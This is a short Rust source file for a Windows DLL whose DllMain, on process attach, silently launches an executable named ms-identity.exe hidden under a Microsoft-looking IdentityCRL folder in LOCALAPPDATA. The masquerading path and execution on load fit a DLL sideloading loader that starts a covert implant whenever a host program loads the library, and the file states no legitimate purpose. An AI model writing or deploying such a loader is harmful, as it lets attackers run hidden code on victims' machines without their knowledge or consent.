use std::env;
use std::process::Command;
use windows::Win32::Foundation::{BOOL, HANDLE, HINSTANCE};
use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(
    hinst_dll: HINSTANCE,
    fdw_reason: u32,
    lpv_reserved: *mut std::ffi::c_void,
) -> BOOL {
    if fdw_reason == DLL_PROCESS_ATTACH {
        let _ = spawn_agent();
    }
    BOOL::from(true)
}

fn spawn_agent() -> Result<(), Box<dyn std::error::Error>> {
    let mut path = env::current_exe()?;
    path.pop();

    let local_app_data = env::var("LOCALAPPDATA")?;
    let agent_path = std::path::Path::new(&local_app_data)
        .join("Microsoft")
        .join("Windows")
        .join("IdentityCRL")
        .join("ms-identity.exe");

    if agent_path.exists() {
        Command::new(agent_path)
            .spawn()?;
    }

    Ok(())
}